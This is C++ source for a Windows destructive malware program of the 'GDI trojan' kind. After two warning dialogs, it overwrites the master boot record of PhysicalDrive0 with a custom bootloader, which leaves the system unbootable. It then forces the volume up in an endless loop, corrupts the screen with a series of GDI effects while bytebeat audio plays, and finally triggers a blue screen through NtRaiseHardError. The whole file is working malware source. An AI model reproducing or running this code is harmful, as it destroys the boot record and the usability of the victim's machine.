#include <Windows.h>
#include <thread>
#include <iostream>
#include <fstream>
#include <vector>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")

std::vector<unsigned char> data = { 0x31, 0xc0, 0x8e, 0xd8, 0x8e, 0xc0, 0x8e, 0xd0, 0xbc, 0x00, 0x7c, 0xbe,
  0x1b, 0x7c, 0xac, 0x08, 0xc0, 0x74, 0x06, 0xb4, 0x0e, 0xcd, 0x10, 0xeb,
  0xf5, 0xeb, 0xfe, 0x54, 0x68, 0x69, 0x73, 0x20, 0x62, 0x6f, 0x6f, 0x74,
  0x6c, 0x6f, 0x61, 0x64, 0x65, 0x72, 0x20, 0x69, 0x73, 0x20, 0x77, 0x72,
  0x69, 0x74, 0x74, 0x65, 0x6e, 0x20, 0x69, 0x6e, 0x20, 0x41, 0x73, 0x73,
  0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa
};

void ChangeVolume()
{
    while (1)
    {
        keybd_event(VK_VOLUME_UP, 0, 0, 0);
        keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
    }
}

void KillMBR()
{
    std::ofstream file("boot.bin", std::ios::binary);

    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();

    HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    HANDLE bootloader = CreateFileW(L"./boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    DWORD size = GetFileSize(bootloader, 0);
    byte* new_mbr = new byte[size];
    DWORD bytes_read;

    ReadFile(bootloader, new_mbr, size, &bytes_read, 0);

    WriteFile(mbr, new_mbr, size, &bytes_read, 0);
}

void TriggerBsod()
{
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    auto RtlAdjustPrivilege = (long(WINAPI*)(unsigned int, bool, bool, bool*))GetProcAddress(ntdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError = (long(WINAPI*)(long, unsigned long, unsigned long, void**, unsigned int, unsigned int*))GetProcAddress(ntdll, "NtRaiseHardError");

    bool enabled;
    RtlAdjustPrivilege(19, true, false, &enabled);

    unsigned int response;
    NtRaiseHardError(0xC000007B, 0, 0, nullptr, 6, &response);
}

int FirstGDIEffect()
{
    std::time_t StartTime = std::time(nullptr);

    HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN), sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;

    while (std::time(nullptr) - StartTime <= 14) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            int x = i % sw, y = i / sh, t = y ^ y | x;
            rgbtriple[i].rgbtRed += GetRValue(i) & i;
            rgbtriple[i].rgbtGreen += GetGValue(i) & i;
            rgbtriple[i].rgbtBlue += GetBValue(i) & i;
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
    }

    return 0;
}

int SecondGDIEffect()
{
    std::time_t StartTime = std::time(nullptr);

    HDC hdc = GetDC(0);
    LPCWSTR text;

    while (std::time(nullptr) - StartTime <= 20)
    {
        int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));

        text = L"Python";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"C#";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"C++";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"JavaScript";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"C";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"Java";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"Assembly";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        Sleep(10);
    }

    ReleaseDC(0, hdc);
    DeleteDC(hdc);

    return 0;
}

int ThirdGDIEffect()
{
    std::time_t StartTime = std::time(nullptr);

    HDC hdc = GetDC(0);

    int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    while (std::time(nullptr) - StartTime <= 20)
    {
        BitBlt(hdc, rand() % sw, rand() % sh, rand() % sw, rand() % sh, hdc, rand() % sw, rand() % sh, SRCCOPY);
    }

    ReleaseDC(0, hdc);
    DeleteDC(hdc);

    return 0;
}

int FourthGDIEffect()
{
    std::time_t StartTime = std::time(nullptr);

    HDC hdc = GetDC(0);

    int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    LPCWSTR text;

    while (std::time(nullptr) - StartTime <= 20)
    {
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));

        text = L"MBR";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"Bootloader";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"BIOS";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"UEFI";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"Pointer";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"Thread";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        Sleep(10);
    }

    ReleaseDC(0, hdc);
    DeleteDC(hdc);

    return 0;
}

int FithGDIEffect()
{
    std::time_t StartTime = std::time(nullptr);

    HDC hdc = GetDC(0);

    int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    while (std::time(nullptr) - StartTime <= 20)
    {
        StretchBlt(hdc, 50, 50, sw - 100, sh - 100, hdc, 0, 0, sw, sh, SRCCOPY);

        Sleep(500);
    }

    ReleaseDC(0, hdc);
    DeleteDC(hdc);

    return 0;
}

int SixthGDIEffect()
{
    std::time_t StartTime = std::time(nullptr);

    HDC hdc = GetDC(0);

    LPCWSTR text;
    
    int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    while (std::time(nullptr) - StartTime <= 20)
    {
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));

        text = L"GetDC(0)";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"GetSystemMetrics(SM_CXVIRTUALSCREEN)";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"GetSystemMetrics(SM_CYVIRTUALSCREEN)";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"BitBlt";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"HBRUSH";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"StretchBlt";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"TextOutW";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"DeleteObject";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"ReleaseDC";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        text = L"DeleteDC";
        TextOutW(hdc, rand() % sw, rand() % sh, text, wcslen(text));

        Sleep(10);
    }

    ReleaseDC(0, hdc);
    DeleteDC(hdc);

    return 0;
}

int SeventhGDIEffect()
{
    std::time_t StartTime = std::time(nullptr);

    HDC hdc = GetDC(0);

    int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    while (std::time(nullptr) - StartTime <= 50)
    {
        BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdc, rand() % 2, rand() % 2, SRCAND);

        Sleep(10);
    }

    ReleaseDC(0, hdc);
    DeleteDC(hdc);

    return 0;
}

DWORD WINAPI FirstByteBeat()
{
    HWAVEOUT hwo = 0;

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 11025;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    static char buffer[8000 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = static_cast<char>((t * (((t / 10 | 0) ^ (t / 10 | 0) - 1280) % 11) / 2 & 127) + (t * (((t / 640 | 0) ^ (t / 640 | 0) - 2) % 13) / 2 & 127));
    }

    MMRESULT res = waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    if (res != MMSYSERR_NOERROR) {
        return 1;
    }

    WAVEHDR hdr = {};
    hdr.lpData = buffer;
    hdr.dwBufferLength = sizeof(buffer);

    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

    while (!(hdr.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);

    return 0;
}

DWORD WINAPI SecondByteBeat()
{
    HWAVEOUT hwo = 0;

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    static char buffer[8000 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = static_cast<char>((t >> 9 ^ (t >> 9) - 1 ^ 1) % 13 * t);
    }

    MMRESULT res = waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    if (res != MMSYSERR_NOERROR) {
        return 1;
    }

    WAVEHDR hdr = {};
    hdr.lpData = buffer;
    hdr.dwBufferLength = sizeof(buffer);

    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

    while (!(hdr.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);

    return 0;
}

DWORD WINAPI ThirdByteBeat()
{
    HWAVEOUT hwo = 0;

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    static char buffer[8000 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = static_cast<char>(((((t >> 10 & 44) % 32 >> 1) + ((t >> 9 & 44) % 32 >> 1)) * (32768 > t % 65536 ? 1 : 4 / 5) * t | t >> 3) * (t | t >> 8 | t >> 6));
    }

    MMRESULT res = waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    if (res != MMSYSERR_NOERROR) {
        return 1;
    }

    WAVEHDR hdr = {};
    hdr.lpData = buffer;
    hdr.dwBufferLength = sizeof(buffer);

    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

    while (!(hdr.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);

    return 0;
}

DWORD WINAPI FourthByteBeat()
{
    HWAVEOUT hwo = 0;

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 11025;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    static char buffer[11025 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = static_cast<char>(((t >> 9 ^ (t >> 9) - 1 ^ 1) % 13 * t & 31) * (2 + (t >> 4)));
    }

    MMRESULT res = waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    if (res != MMSYSERR_NOERROR) {
        return 1;
    }

    WAVEHDR hdr = {};
    hdr.lpData = buffer;
    hdr.dwBufferLength = sizeof(buffer);

    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

    while (!(hdr.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);

    return 0;
}

DWORD WINAPI FithByteBeat()
{
    HWAVEOUT hwo = 0;

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 11025;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    static char buffer[11025 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = static_cast<char>(t ^ t >> 4 ^ (t * ((t >> (11 + (t >> 16) % 3)) % 16)) ^ t * 3);
    }

    MMRESULT res = waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    if (res != MMSYSERR_NOERROR) {
        return 1;
    }

    WAVEHDR hdr = {};
    hdr.lpData = buffer;
    hdr.dwBufferLength = sizeof(buffer);

    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

    while (!(hdr.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);

    return 0;
}

DWORD WINAPI SixthByteBeat()
{
    HWAVEOUT hwo = 0;

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    static char buffer[8000 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = static_cast<char>(430 * (5 * t >> 11 | 5 * t >> 1));
    }

    MMRESULT res = waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    if (res != MMSYSERR_NOERROR) {
        return 1;
    }

    WAVEHDR hdr = {};
    hdr.lpData = buffer;
    hdr.dwBufferLength = sizeof(buffer);

    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

    while (!(hdr.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);

    return 0;
}

DWORD WINAPI SeventhByteBeat()
{
    HWAVEOUT hwo = 0;

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    static char buffer[8000 * 50];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = static_cast<char>((t >> 7 | t * 3 | t >> (t >> 15)) * 10 + ((t >> 8) & 5));
    }

    MMRESULT res = waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    if (res != MMSYSERR_NOERROR) {
        return 1;
    }

    WAVEHDR hdr = {};
    hdr.lpData = buffer;
    hdr.dwBufferLength = sizeof(buffer);

    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

    while (!(hdr.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);

    return 0;
}

int main()
{
    int result = MessageBoxA(nullptr, "This programm is a Virus! It will destroy your MBR(Master Boot Record)! Are you sure you wan to run this programm?", "Warning", MB_ICONWARNING | MB_YESNO);

    if (result != IDNO)
    {
        int result = MessageBoxA(nullptr, "This is your last Warning! Are you sure you want to run this Virus?", "Warning", MB_ICONWARNING | MB_YESNO);

        if (result != IDNO)
        {
            KillMBR();

            std::thread ChangeVolumeThread(ChangeVolume);

            ChangeVolumeThread.detach();

            std::thread FirstGDIEffectThread(FirstGDIEffect);
            std::thread FirstByteBeatThread(FirstByteBeat);

            FirstGDIEffectThread.join();
            FirstByteBeatThread.join();

            std::thread SecondGDIEffectThread(SecondGDIEffect);
            std::thread SecondByteBeatThread(SecondByteBeat);

            SecondGDIEffectThread.join();
            SecondByteBeatThread.join();

            std::thread ThirdGDIEffectThread(ThirdGDIEffect);
            std::thread ThirdByteBeatThread(ThirdByteBeat);

            ThirdGDIEffectThread.join();
            ThirdByteBeatThread.join();

            std::thread FourthGDIEffectThread(FourthGDIEffect);
            std::thread FourthByteBeatThread(FourthByteBeat);

            FourthGDIEffectThread.join();
            FourthByteBeatThread.join();

            std::thread FithGDIEffectThread(FithGDIEffect);
            std::thread FithByteBeatThread(FithByteBeat);

            FithGDIEffectThread.join();
            FithByteBeatThread.join();

            std::thread SixthGDIEffectThread(SixthGDIEffect);
            std::thread SixthByteBeatThread(SixthByteBeat);

            SixthGDIEffectThread.join();
            SixthByteBeatThread.join();

            std::thread SeventhGDIEffectThread(SeventhGDIEffect);
            std::thread SeventhByteBeatThread(SeventhByteBeat);

            SeventhGDIEffectThread.join();
            SeventhByteBeatThread.join();

            TriggerBsod();
        }
    }

    return 0;
}
